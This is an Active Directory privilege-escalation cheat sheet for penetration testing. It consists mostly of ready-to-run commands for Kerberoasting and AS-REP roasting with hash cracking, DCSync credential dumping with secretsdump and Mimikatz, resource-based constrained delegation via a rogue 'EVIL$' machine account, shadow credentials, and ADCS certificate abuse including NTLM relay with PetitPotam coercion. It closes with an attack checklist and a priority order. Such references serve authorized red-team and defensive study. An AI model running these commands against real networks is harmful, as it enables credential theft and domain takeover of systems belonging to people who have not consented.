# Active Directory Privilege Escalation — Deep Reference

## AD Enumeration Prerequisites
```bash
# From Linux (Impacket suite)
pip3 install impacket

# Verify connectivity
crackmapexec smb <dc_ip>
ldapsearch -x -H ldap://<dc_ip> -b "DC=domain,DC=local"

# From Windows (PowerView / BloodHound)
powershell -ep bypass -c "Import-Module .\PowerView.ps1"
.\SharpHound.exe -c All --zipfilename bloodhound.zip
```

---

## Kerberoasting (T1558.003)

### Theory
- Service accounts with SPNs get TGS tickets encrypted with their password hash
- Any domain user can request TGS tickets for any SPN
- Crack offline — no lockout, no detection (unless monitored)

### Discovery
```bash
# Impacket — find and request
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password>
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -hashes <lm:nt>

# With request (get crackable hashes)
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password> -outputfile tgs_hashes.txt

# PowerView (from Windows)
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName
# Request tickets:
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.domain.local:1433"
# Export from memory with Mimikatz:
mimikatz # kerberos::list /export
```

### Cracking
```bash
# Hashcat (mode 13100 for TGS-REP / rc4)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Hashcat mode 19700 for AES-256 TGS (etype 18)
hashcat -m 19700 tgs_aes_hashes.txt wordlist.txt

# John
john --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt
```

### High-Value Targets
- Accounts with admin group memberships
- Accounts with delegation privileges
- MSSQL service accounts (often domain admin or high-priv)

---

## AS-REP Roasting (T1558.004)

### Theory
- Accounts with "Do not require Kerberos preauthentication" enabled
- Can request AS-REP without knowing the password
- AS-REP is encrypted with user's password hash — crack offline

### Discovery
```bash
# With credentials — enumerate vulnerable accounts
GetNPUsers.py <domain>/ -dc-ip <dc_ip> -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# With valid creds — find accounts automatically
GetNPUsers.py <domain>/<user>:<password> -dc-ip <dc_ip> -request -format hashcat

# LDAP query for DONT_REQ_PREAUTH (bit 4194304)
ldapsearch -x -H ldap://<dc_ip> -D "<user>@<domain>" -w "<password>" \
  -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# PowerView
Get-DomainUser -PreauthNotRequired | Select SamAccountName
```

### Cracking
```bash
# Hashcat mode 18200
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

---

## DCSync (T1003.006)

### Theory
- Abuses Directory Replication Service (DRS) protocol
- Requires: `Replicating Directory Changes` + `Replicating Directory Changes All` rights
- Default holders: Domain Admins, Enterprise Admins, DC computer accounts

### Check Permissions
```bash
# Check who has replication rights
# PowerView:
Get-ObjectACL -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
} | Select SecurityIdentifier, ObjectType, ActiveDirectoryRights

# Or with ldapsearch, look for:
# 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)
# 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)
```

### Exploitation
```bash
# Impacket secretsdump — dump all hashes
secretsdump.py <domain>/<user>:<password>@<dc_ip>
secretsdump.py <domain>/<user>@<dc_ip> -hashes <lm:nt>

# Dump specific user
secretsdump.py <domain>/<user>:<password>@<dc_ip> -just-dc-user administrator

# Just NTLM hashes (faster)
secretsdump.py <domain>/<user>:<password>@<dc_ip> -just-dc-ntlm

# Mimikatz
mimikatz # lsadump::dcsync /domain:<domain> /user:Administrator
mimikatz # lsadump::dcsync /domain:<domain> /all /csv
```

---

## Resource-Based Constrained Delegation (RBCD)

### Theory
- If you can write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object
- You can impersonate any user to that computer's services
- Requires: ability to create a machine account (default: any domain user, up to MachineAccountQuota)

### Prerequisites Check
```bash
# Check MachineAccountQuota (default 10)
crackmapexec ldap <dc_ip> -u <user> -p <password> -M MAQ

# Check who can write to target's msDS-AllowedToActOnBehalfOfOtherIdentity
# BloodHound: look for GenericWrite/GenericAll/WriteDACL on computer objects
```

### Exploitation
```bash
# Step 1: Create machine account
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ssw0rd' \
  -dc-ip <dc_ip> <domain>/<user>:<password>

# Step 2: Set RBCD — delegate from EVIL$ to target
rbcd.py -delegate-to '<target_machine>$' -delegate-from 'EVIL$' \
  -dc-ip <dc_ip> <domain>/<user>:<password>

# Alternative with Impacket:
python3 rbcd.py -action write -delegate-to '<target_machine>$' -delegate-from 'EVIL$' \
  -dc-ip <dc_ip> <domain>/<user>:<password>

# Step 3: Request impersonated service ticket
getST.py -spn cifs/<target_machine>.<domain> -impersonate Administrator \
  -dc-ip <dc_ip> <domain>/EVIL$:'P@ssw0rd'

# Step 4: Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <target_machine>.<domain>
smbexec.py -k -no-pass <target_machine>.<domain>
wmiexec.py -k -no-pass <target_machine>.<domain>
```

---

## Shadow Credentials

### Theory
- Write to `msDS-KeyCredentialLink` attribute on a user/computer object
- Add a certificate-based credential
- Authenticate as that user/computer using PKINIT
- Requires: write access to the target's KeyCredentialLink (GenericWrite/GenericAll)

### Exploitation
```bash
# pywhisker — add shadow credential
pywhisker.py -d <domain> -u <user> -p <password> \
  --target <target_user> --action add --dc-ip <dc_ip>
# Saves: <target_user>.pfx and shows the pfx password

# Authenticate with certificate via PKINIT
getTGT.py -pfx <target_user>.pfx -dc-ip <dc_ip> <domain>/<target_user>

# Use the TGT
export KRB5CCNAME=<target_user>.ccache
secretsdump.py -k -no-pass <dc_ip>

# Certipy alternative
certipy shadow auto -u <user>@<domain> -p <password> -account <target_user>
```

---

## ADCS Abuse (Active Directory Certificate Services)

### Enumeration
```bash
# Find vulnerable certificate templates
certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable
certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout

# Key output to look for:
# [!] Vulnerabilities: ESC1, ESC2, ESC3, ESC4, ESC6, ESC7, ESC8
```

### ESC1 — Enrollee Supplies Subject
```bash
# Template allows requester to specify Subject Alternative Name (SAN)
# AND: low-privilege user can enroll
# AND: Manager approval not required

certipy req -u <user>@<domain> -p <password> \
  -ca <ca_name> -template <vuln_template> \
  -upn administrator@<domain> -dc-ip <dc_ip>

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
# Returns NT hash for administrator
```

### ESC4 — Vulnerable Template ACLs
```bash
# User has write access to template configuration
# Modify template to enable ESC1 conditions, then exploit as ESC1

certipy template -u <user>@<domain> -p <password> \
  -template <vuln_template> -save-old
# Modifies template to allow SAN specification
# Then request as ESC1:
certipy req -u <user>@<domain> -p <password> \
  -ca <ca_name> -template <vuln_template> \
  -upn administrator@<domain>
# Restore original template:
certipy template -u <user>@<domain> -p <password> \
  -template <vuln_template> -configuration <saved_config>
```

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag
```bash
# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
# Any template can be abused for SAN specification
certipy req -u <user>@<domain> -p <password> \
  -ca <ca_name> -template User \
  -upn administrator@<domain>
```

### ESC8 — NTLM Relay to ADCS HTTP Enrollment
```bash
# CA has HTTP enrollment endpoint (certsrv)
# Relay NTLM auth to it

# Start relay
ntlmrelayx.py -t http://<ca_server>/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Coerce authentication (PetitPotam, PrinterBug, etc.)
python3 PetitPotam.py <attacker_ip> <dc_ip>

# Use obtained certificate
certipy auth -pfx <dc_machine>.pfx -dc-ip <dc_ip>
# Then DCSync with the DC machine account
```

---

## AD PrivEsc Checklist

```
1. [ ] Run BloodHound (SharpHound collection)
2. [ ] Check Kerberoastable accounts (SPN set)
3. [ ] Check AS-REP Roastable accounts (no pre-auth)
4. [ ] Check DCSync permissions (replication rights)
5. [ ] Check delegation settings (unconstrained, constrained, RBCD)
6. [ ] Check ADCS (certipy find -vulnerable)
7. [ ] Check GenericAll/GenericWrite on users/computers
8. [ ] Check group memberships (nested groups!)
9. [ ] Check GPO permissions (writable GPOs)
10. [ ] Check LAPS (ms-mcs-AdmPwd readable?)
11. [ ] Check gMSA passwords (msDS-ManagedPassword readable?)
12. [ ] Check Shadow Credentials (KeyCredentialLink writable?)
```

## Attack Priority
```
1. Kerberoasting       → Easy, any domain user, offline crack
2. AS-REP Roasting     → Easy if accounts exist, offline crack
3. ADCS ESC1/ESC4      → Direct admin cert if template vulnerable
4. RBCD                → If GenericWrite on computer objects
5. Shadow Credentials  → If GenericWrite on user/computer objects
6. DCSync              → If replication rights exist
7. ADCS ESC8           → Requires coercion + relay setup
```
